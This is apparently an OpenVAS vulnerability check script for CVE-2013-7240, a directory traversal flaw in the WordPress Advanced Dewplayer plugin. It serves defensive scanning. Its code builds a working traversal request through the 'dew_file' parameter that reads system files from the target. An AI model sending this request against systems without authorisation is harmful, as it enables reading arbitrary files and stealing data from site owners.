###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_dewplayer_dir_trav_vuln.nasl 34182 2014-01-07 16:29:23Z Jan$
#
# WordPress Advanced Dewplayer 'dew_file' Directory Traversal Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804058";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2013-7240");
  script_bugtraq_id(64587);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2014-01-07 16:29:23 +0530 (Tue, 07 Jan 2014)");
  script_name("WordPress Advanced Dewplayer 'dew_file' Directory Traversal Vulnerability");

  tag_summary =
"This host is installed with Wordpress Advanced Dewplayer Plugin and is prone
to directory traversal vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
local file or not.";

  tag_insight =
"Flaw is due to the 'download-file.php' script not properly sanitizing user
input, specifically path traversal style attacks (e.g. '../') supplied via
the 'dew_file' parameter.";

  tag_impact =
"Successful exploitation will allow remote attackers to read arbitrary files
on the target system.

Impact Level: Application";

  tag_affected =
"WordPress Advanced Dewplayer 1.2, Other versions may also be affected.";

  tag_solution =
"Upgrade to WordPress Advanced Dewplayer 1.3 or later,
For updates refer to http://wordpress.org/plugins/advanced-dewplayer";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/55941");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2013/q4/566");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = dir + "/wp-content/plugins/advanced-dewplayer/admin-panel" +
        "/download-file.php?dew_file=" + crap(data:"../",length:3*15) +
        files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    security_message(port:http_port);
    exit(0);
  }
}
